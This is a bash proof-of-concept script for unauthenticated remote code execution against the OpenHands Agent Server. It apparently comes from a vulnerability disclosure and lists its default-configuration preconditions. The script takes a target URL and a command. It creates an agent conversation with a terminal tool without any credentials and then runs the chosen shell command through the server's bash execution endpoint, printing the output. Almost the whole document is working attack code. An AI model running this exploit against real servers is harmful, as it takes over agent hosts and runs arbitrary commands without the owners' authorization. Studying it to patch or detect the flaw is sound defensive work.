#!/usr/bin/env bash
# PoC: unauthenticated remote code execution in OpenHands Agent Server
# (openhands-agent-server 1.54.0, default configuration)
#
# Preconditions (both are defaults, not misconfigurations):
#   1. agent-server reachable on the network  (it binds --host 0.0.0.0 in docker mode and
#      DockerWorkspace publishes "-p <host_port>:8000")
#   2. session_api_keys not configured  (default = empty  =>  check_session_api_key is a no-op)
#
# No credentials. No malicious repository. No user interaction. No LLM call.
#
# Usage:  ./poc_unauth_rce.sh http://TARGET:PORT "id; hostname"
set -euo pipefail

TARGET="${1:?usage: $0 http://host:port [command]}"
CMD="${2:-id; hostname; ls /}"

echo "[1] health (no auth):"
curl -s -o /dev/null -w "    HTTP %{http_code}\n" "$TARGET/health"

echo "[2] create conversation (no auth header):"
RESP=$(curl -s -X POST "$TARGET/api/conversations" \
  -H "Content-Type: application/json" \
  -d '{
        "agent": {
          "llm": {"usage_id": "x", "model": "deepseek/deepseek-chat", "api_key": "dummy"},
          "tools": [{"name": "terminal", "params": {}}]
        },
        "workspace": {"working_dir": "/tmp"},
        "initial_message": {"role": "user",
                            "content": [{"type": "text", "text": "hi"}]}
      }')
ID=$(printf '%s' "$RESP" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("id") or d.get("conversation_id"))')
echo "    conversation id: $ID"

echo "[3] execute shell command (no auth header):"
curl -s -X POST "$TARGET/api/conversations/$ID/bash/execute_bash_command" \
  -H "Content-Type: application/json" \
  -d "$(python3 -c 'import json,sys;print(json.dumps({"command":sys.argv[1],"timeout":60}))' "$CMD")" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print("    exit_code:",d["exit_code"]);print(d["stdout"])'
